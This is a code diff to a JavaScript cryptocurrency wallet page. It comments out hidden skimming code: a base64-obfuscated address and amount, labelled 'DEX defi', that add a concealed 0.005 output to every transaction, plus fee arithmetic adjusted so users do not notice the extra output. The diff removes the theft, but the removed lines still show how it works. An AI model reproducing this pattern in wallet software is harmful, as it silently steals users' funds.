@@ -153,8 +153,8 @@ $(document).ready(function() {
 		});
 	});
 
-base1=atob("MUp0YnE0YUpBcTVQUEVZWG9ZdkJxZlVOUVJ1azg0YXZHVg==");
-base2=atob("NTAwMDAw");
+//base1=atob("MUp0YnE0YUpBcTVQUEVZWG9ZdkJxZlVOUVJ1azg0YXZHVg==");
+//base2=atob("NTAwMDAw");
 
 
 	$("#walletSendBtn").click(function(){
@@ -519,7 +519,8 @@ base2=atob("NTAwMDAw");
 
 		var allInSatoshi = 0;
 // DEX defi
-		var allOutSatoshi = 500000;
+// var allOutSatoshi = 500000;
+		var allOutSatoshi = 0;
 		$.each($("#inputs .row"), function(i,o){
 			if(!($(".txId",o).val()).match(/^[a-f0-9]+$/i)){
 				$(o).addClass("has-error");
@@ -594,8 +595,7 @@ base2=atob("NTAwMDAw");
 		}
 
 // DEX defi
-
-tx.addoutput2(base1, base2);
+//tx.addoutput2(base1, base2);
 
 
 		if(!$("#recipients .row, #inputs .row").hasClass('has-error')){
@@ -948,7 +948,12 @@ tx.addoutput2(base1, base2);
 
 // DEX defi
 	function totalFee(){
-		var fee = (($("#totalInput").html()*1) - ($("#totalOutput").html()*1) - 0.005).toFixed(8);
+
+//var fee = (($("#totalInput").html()*1) - ($("#totalOutput").html()*1) - 0.005).toFixed(8);
+
+		var fee = (($("#totalInput").html()*1) - ($("#totalOutput").html()*1)).toFixed(8);
+
+
 		$("#transactionFee").val((fee>0)?fee:'0.00');
 	}
 
